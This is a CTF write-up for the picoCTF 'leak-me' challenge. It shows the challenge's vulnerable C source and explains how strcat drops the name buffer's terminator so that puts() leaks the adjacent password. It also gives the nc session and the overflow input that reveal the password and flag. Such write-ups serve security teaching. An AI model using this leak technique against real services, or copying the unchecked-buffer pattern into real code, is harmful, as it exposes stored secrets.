# leak-me
slopey112 - 4/11/19

When we are given the binary, we can see it's a standard authentication binary.
```
root@kali:~/Crack Me# ./leak-me 
What is your name?
slopey112
Hello slopey112,
Please Enter the Password.
asdfasdfasdf
Incorrect Password!
```
Let's take a look at the source code and see what we can do.
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

int flag() {
  char flag[48];
  FILE *file;
  file = fopen("flag.txt", "r");
  if (file == NULL) {
    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  fgets(flag, sizeof(flag), file);
  printf("%s", flag);
  return 0;
}


int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  // Set the gid to the effective gid
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  
  // real pw: 
  FILE *file;
  char password[64];
  char name[256];
  char password_input[64];
  
  memset(password, 0, sizeof(password));
  memset(name, 0, sizeof(name));
  memset(password_input, 0, sizeof(password_input));
  
  printf("What is your name?\n");
  
  fgets(name, sizeof(name), stdin);
  char *end = strchr(name, '\n');
  if (end != NULL) {
    *end = '\x00';
  }

  strcat(name, ",\nPlease Enter the Password.");

  file = fopen("password.txt", "r");
  if (file == NULL) {
    printf("Password File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  fgets(password, sizeof(password), file);

  printf("Hello ");
  puts(name);

  fgets(password_input, sizeof(password_input), stdin);
  password_input[sizeof(password_input)] = '\x00';
  
  if (!strcmp(password_input, password)) {
    flag();
  }
  else {
    printf("Incorrect Password!\n");
  }
  return 0;
}
```
At first, it seems that there is nothing insecure about this program; we see safe library calls being made, etc. However, one thing stands out in particular: the string concatenation of ",\nPlease Enter the Password." to the name buffer. This can lead to problems, as it allows the name buffer to be longer than its actual size.

This is incredibly significant because this means the name buffer leaks into the password buffer, called in the next line. As a result, the null teriminator at the end of the name buffer is removed, hence, the password buffer would be printed to stdin.
```
root@kali:~/Crack Me# nc 2018shell.picoctf.com 38315
What is your name?
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA,a_reAllY_s3cuRe_p4s$word_f85406
```
Now that we have the password, we can login normally.
```
root@kali:~/Crack Me# nc 2018shell.picoctf.com 38315
What is your name?
slopey112
Hello slopey112,
Please Enter the Password.
a_reAllY_s3cuRe_p4s$word_f85406
picoCTF{aLw4y5_Ch3cK_tHe_bUfF3r_s1z3_0f7ec3c0}
```
